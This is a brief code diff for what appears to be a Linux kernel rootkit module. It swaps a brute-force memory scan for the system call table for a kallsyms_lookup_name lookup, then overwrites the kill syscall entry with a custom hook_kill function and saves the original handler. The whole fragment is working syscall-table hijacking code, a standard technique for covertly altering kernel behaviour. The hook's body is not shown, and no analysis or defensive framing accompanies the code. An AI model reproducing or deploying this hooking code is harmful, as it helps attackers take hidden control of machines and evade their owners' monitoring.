@@ -32,23 +32,9 @@ asmlinkage long hook_kill(pid_t pid, int sig){
     return orig_kill(pid, sig);
 }
 
-static unsigned long **fetch_table_addr(void) {
-	unsigned long offset;
-	unsigned long **track;
-
-	for(offset = PAGE_OFFSET; offset < ULLONG_MAX;
-	    offset += sizeof(void *)) {
-		track = (unsigned long **) offset;
-
-		if(track[__NR_kill] == (unsigned long *) sys_kill)
-			return track;
-    	}
-	
-	return NULL;
-}
 
 void init_kill_hook(void){
-    uint64_t ** syscall_table = (uint64_t **) fetch_table_addr();
+    uint64_t ** syscall_table = (uint64_t **) kallsyms_lookup_name("sys_call_table");
     syscall_table_kill = (uint64_t **) (&syscall_table[__NR_kill]);
     orig_kill = (sys_kill_t)*syscall_table_kill; 
     *syscall_table_kill = (uint64_t*)hook_kill;
